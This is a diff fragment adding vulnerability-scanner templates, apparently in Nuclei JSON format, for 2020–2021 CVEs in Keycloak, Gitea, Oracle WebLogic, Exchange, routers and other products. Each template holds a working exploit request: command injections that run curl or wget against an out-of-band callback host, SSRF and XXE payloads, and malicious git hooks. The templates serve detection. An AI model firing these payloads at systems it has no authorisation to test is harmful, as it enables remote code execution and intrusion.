+      "info": {
+        "name": "Keycloak <= 12.0.1 - request_uri Blind Server-Side Request Forgery (SSRF)",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2020",
+          "keycloak",
+          "ssrf",
+          "oast",
+          "blind",
+          "packetstorm",
+          "edb"
+        ],
+        "cve": "CVE-2020-10770",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14144",
+      "info": {
+        "name": "Gitea 1.1.0 - 1.12.5 - Remote Code Execution",
+        "severity": "high",
+        "tags": [
+          "cve2020",
+          "cve",
+          "rce",
+          "gitea",
+          "authenticated",
+          "git",
+          "intrusive",
+          "vuln"
+        ],
+        "cve": "CVE-2020-14144",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "Gitea:"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /user/login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /user/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}\n",
+            "GET /repo/create HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /repo/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&uid=1&repo_name={{randstr}}&private=on&description=&repo_template=&issue_labels=&gitignores=&license=&readme=Default&auto_init=on&default_branch=master\n",
+            "POST /{{username}}/{{randstr}}/settings/hooks/git/post-receive HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&content=%23%21%2Fbin%2Fbash%0D%0Acurl+{{interactsh-url}}\n",
+            "GET /{{username}}/{{randstr}}/_new/master HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /{{username}}/{{randstr}}/_new/master HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&last_commit={{last_commit}}&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14882",
+      "info": {
+        "name": "Oracle Weblogic Server - Remote Command Execution",
+        "severity": "critical",
+        "tags": [
+          "cve2020",
+          "cve",
+          "oracle",
+          "rce",
+          "weblogic",
+          "oast",
+          "kev",
+          "vkev"
+        ],
+        "cve": "CVE-2020-14882",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "ADMINCONSOLESESSION"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext('http://{{interactsh-url}}')"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-15867",
+      "info": {
+        "name": "Gogs 0.5.5 - 0.12.2 - Remote Code Execution",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2020",
+          "rce",
+          "gogs",
+          "git",
+          "authenticated",
+          "packetstorm",
+          "intrusive"
+        ],
+        "cve": "CVE-2020-15867",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "content=\"Gogs"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /user/login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /user/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}\n",
+            "GET /repo/create HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /repo/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&user_id=1&repo_name={{randstr}}&private=on&description=&gitignores=&license=&readme=Default&auto_init=on\n",
+            "POST /{{username}}/{{randstr}}/settings/hooks/git/post-receive HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&content=%23%21%2Fbin%2Fbash%0D%0Acurl+{{interactsh-url}}\n",
+            "GET /{{username}}/{{randstr}}/_new/master HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /{{username}}/{{randstr}}/_new/master HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_csrf={{auth_csrf}}&last_commit={{last_commit}}&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-17456",
+      "info": {
+        "name": "SEOWON INTECH SLC-130 & SLR-120S - Unauthenticated Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2020",
+          "seowon",
+          "oast",
+          "packetstorm",
+          "rce",
+          "router",
+          "unauth"
+        ],
+        "cve": "CVE-2020-17456",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi-bin/login.cgi HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\nbrowserTime=081119502020&currentTime=1597159205&expires=Wed%252C%2B12%2BAug%2B2020%2B15%253A20%253A05%2BGMT&Command=Submit&user=admin&password=admin\n",
+            "POST /cgi-bin/system_log.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nCommand=Diagnostic&traceMode=ping&reportIpOnly=&pingIpAddr=;curl+http%3a//{{interactsh-url}}+-H+'User-Agent%3a+{{useragent}}'&pingPktSize=56&pingTimeout=30&pingCount=4&maxTTLCnt=30&queriesCnt=3&reportIpOnlyCheckbox=on&logarea=com.cgi&btnApply=Apply&T=1646950471018\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-1956",
+      "info": {
+        "name": "Apache Kylin 3.0.1 - Command Injection Vulnerability",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2020",
+          "apache",
+          "kylin",
+          "rce",
+          "oast",
+          "kev",
+          "vkev"
+        ],
+        "cve": "CVE-2020-1956",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: curl"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /kylin/api/user/authentication HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic {{base64('{{username}}:' + '{{password}}')}}\n",
+            "POST /kylin/api/cubes/kylin_streaming_cube/%2031%60curl%20{{interactsh-url}}%60/migrate HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-25223",
+      "info": {
+        "name": "Sophos UTM Preauth - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2020",
+          "sophos",
+          "rce",
+          "oast",
+          "unauth",
+          "kev",
+          "vkev"
+        ],
+        "cve": "CVE-2020-25223",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /var HTTP/1.1\nHost: {{Hostname}}\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.5.1.1\nContent-Type: application/json; charset=UTF-8\nOrigin: {{BaseURL}}\nConnection: close\nReferer: {{BaseURL}}\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\n{\"objs\": [{\"FID\": \"init\"}], \"SID\": \"|wget http://{{interactsh-url}}|\", \"browser\": \"gecko_linux\", \"backend_version\": -1, \"loc\": \"\", \"_cookie\": null, \"wdebug\": 0, \"RID\": \"1629210675639_0.5000855117488202\", \"current_uuid\": \"\", \"ipv6\": true}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-25506",
+      "info": {
+        "name": "D-Link DNS-320 - Unauthenticated Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2020",
+          "dlink",
+          "rce",
+          "oast",
+          "mirai",
+          "unauth",
+          "router"
+        ],
+        "cve": "CVE-2020-25506",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi-bin/system_mgr.cgi? HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\nC1=ON&cmd=cgi_ntp_time&f_ntp_server=`curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'`\n",
+            "POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'` HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-26919",
+      "info": {
+        "name": "NETGEAR ProSAFE Plus - Unauthenticated Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2020",
+          "netgear",
+          "rce",
+          "oast",
+          "router",
+          "unauth",
+          "kev"
+        ],
+        "cve": "CVE-2020-26919",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /login.htm HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\nsubmitId=debug&debugCmd=wget+http://{{interactsh-url}}&submitEnd=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-28188",
+      "info": {
+        "name": "TerraMaster TOS - Unauthenticated Remote Command Execution",
+        "severity": "critical",
+        "tags": [
+          "cve2020",
+          "cve",
+          "packetstorm",
+          "terramaster",
+          "rce",
+          "oast",
+          "mirai",
+          "unauth"
+        ],
+        "cve": "CVE-2020-28188",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /include/makecvs.php?Event=%60curl+http%3a//{{interactsh-url}}+-H+'User-Agent%3a+{{useragent}}'%60 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /tos/index.php?explorer/pathList&path=%60curl+http%3a//{{interactsh-url}}+-H+'User-Agent%3a+{{useragent}}'%60 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-35713",
+      "info": {
+        "name": "Belkin Linksys RE6500 <1.0.012.001 - Remote Command Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2020",
+          "linksys",
+          "rce",
+          "oast",
+          "router",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2020-35713",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /goform/setSysAdm HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/login.shtml\n\nadmuser=admin&admpass=;wget http://{{interactsh-url}};&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5412",
+      "info": {
+        "name": "Spring Cloud Netflix - Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2020",
+          "ssrf",
+          "springcloud",
+          "vmware",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2020-5412",
+        "prerequisite": false,
+        "cwe": "CWE-610,CWE-441"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "Jelly"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/proxy.stream?origin=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5775",
+      "info": {
+        "name": "Canvas LMS v2020-07-29 - Blind Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2020",
+          "ssrf",
+          "oast",
+          "blind",
+          "tenable",
+          "instructure",
+          "vkev"
+        ],
+        "cve": "CVE-2020-5775",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/external_content/retrieve/oembed?endpoint=http://{{interactsh-url}}&url=foo"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-7796",
+      "info": {
+        "name": "Zimbra Collaboration Suite < 8.8.15 Patch 7 - Server-Side Request Forgery",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2020",
+          "zimbra",
+          "ssrf",
+          "oast",
+          "synacor",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2020-7796",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://{{interactsh-url}}%23 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-9314",
+      "info": {
+        "name": "Oracle iPlanet Web Server 7.0.x - Image Injection",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2020",
+          "oracle",
+          "iplanet",
+          "injection",
+          "vkev"
+        ],
+        "cve": "CVE-2020-9314",
+        "prerequisite": false,
+        "cwe": "CWE-79"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "productNameSrc",
+                "Oracle iPlanet"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/admingui/version/Version?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500",
+            "/admingui/version/Masthead.jsp?productNameSrc=http://{{interactsh-url}}/test.jpg&productNameHeight=500&productNameWidth=500"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-1498",
+      "info": {
+        "name": "Cisco HyperFlex HX Data Platform - Remote Command Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2021",
+          "kev",
+          "packetstorm",
+          "cisco",
+          "rce",
+          "oast",
+          "mirai"
+        ],
+        "cve": "CVE-2021-1498",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /storfs-asup HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\naction=&token=`wget http://{{interactsh-url}}`&mode=`wget http://{{interactsh-url}}`\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-21881",
+      "info": {
+        "name": "Lantronix PremierWave 2050 8.9.0.0R4 - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "lantronix",
+          "rce",
+          "oast",
+          "cisco",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-21881",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            }
+          ],
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic dXNlcjp1c2Vy\nContent-Type: application/x-www-form-urlencoded\n\najax=WLANScanSSID&iehack=&Scan=Scan&netnumber=1&2=link&3=3&ssid=\"'; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}' #\n",
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46UEFTUw==\nContent-Type: application/x-www-form-urlencoded\n\najax=WLANScanSSID&iehack=&Scan=Scan&netnumber=1&2=link&3=3&ssid=\"'; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-22053",
+      "info": {
+        "name": "Spring Cloud Netflix Hystrix Dashboard <2.2.10 - Remote Code Execution",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2021",
+          "rce",
+          "spring",
+          "vmware",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-22053",
+        "prerequisite": false,
+        "cwe": "CWE-94"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "interactsh_request",
+              "regex": [
+                "User-Agent: (curl|CertUtil)"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(\"curl http://{{interactsh-url}}\")}__::.x/",
+            "/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(\"certutil -urlcache -split -f http://{{interactsh-url}}\")}__::.x/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-25052",
+      "info": {
+        "name": "WordPress Button Generator <2.3.3 - Remote File Inclusion",
+        "severity": "high",
+        "tags": [
+          "cve2021",
+          "cve",
+          "wp-plugin",
+          "authenticated",
+          "wpscan",
+          "rfi",
+          "wp",
+          "wordpress"
+        ],
+        "cve": "CVE-2021-25052",
+        "prerequisite": false,
+        "cwe": "CWE-352"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=wow-company&tab=http://{{interactsh-url}}/ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-26072",
+      "info": {
+        "name": "Atlassian Confluence < 5.8.6 - Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2021",
+          "confluence",
+          "atlassian",
+          "ssrf",
+          "oast",
+          "vuln",
+          "vkev"
+        ],
+        "cve": "CVE-2021-26072",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "faviconURL",
+                "domain"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-26855",
+      "info": {
+        "name": "Microsoft Exchange Server SSRF Vulnerability",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "ssrf",
+          "rce",
+          "exchange",
+          "oast",
+          "microsoft",
+          "kev"
+        ],
+        "cve": "CVE-2021-26855",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /owa/auth/x.js HTTP/1.1\nHost: {{Hostname}}\nCookie: X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-27931",
+      "info": {
+        "name": "LumisXP <10.0.0 - Blind XML External Entity Attack",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "lumis",
+          "xxe",
+          "oast",
+          "blind",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-27931",
+        "prerequisite": false,
+        "cwe": "CWE-611"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /lumis/portal/controller/xml/PageControllerXml.jsp HTTP/1.1\nHost: {{Hostname}}\n\n<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY xxe SYSTEM \"http://{{interactsh-url}}\">\n]>\n<method name=\"addPage\">\n<id>&xxe;</id>\n</method>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-31755",
+      "info": {
+        "name": "Tenda Router AC11 - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "tenda",
+          "rce",
+          "oast",
+          "router",
+          "mirai",
+          "kev"
+        ],
+        "cve": "CVE-2021-31755",
+        "prerequisite": false,
+        "cwe": "CWE-787"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /goform/setmac HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/index.htmlr\nContent-Type: application/x-www-form-urlencoded\n\nmodule1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&mac=wget+http://{{interactsh-url}}&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-32305",
+      "info": {
+        "name": "Websvn <2.6.1 - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2021",
+          "websvn",
+          "rce",
+          "oast",
+          "packetstorm",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-32305",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /search.php?search=%22;wget+http%3A%2F%2F{{interactsh-url}}%27;%22 HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-32819",
+      "info": {
+        "name": "Nodejs Squirrelly - Remote Code Execution",
+        "severity": "high",
+        "tags": [
+          "cve2021",
+          "cve",
+          "nodejs",
+          "rce",
+          "oast",
+          "squirrelly",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-32819",
+        "prerequisite": false,
+        "cwe": "CWE-200,NVD-CWE-NOINFO"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: Wget"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://{{interactsh-url}}%27);//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-33357",
+      "info": {
+        "name": "RaspAP <=2.6.5 - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2021",
+          "cve",
+          "rce",
+          "raspap",
+          "oast",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-33357",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "DHCPEnabled"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}/`whoami`;"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-33544",
+      "info": {
+        "name": "Geutebruck - Remote Command Injection",
+        "severity": "high",
+        "tags": [
+          "cve2021",
+          "cve",
+          "geutebruck",
+          "rce",
+          "oast",
+          "geutebrueck",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2021-33544",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://{{interactsh-url}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-36380",
+      "info": {
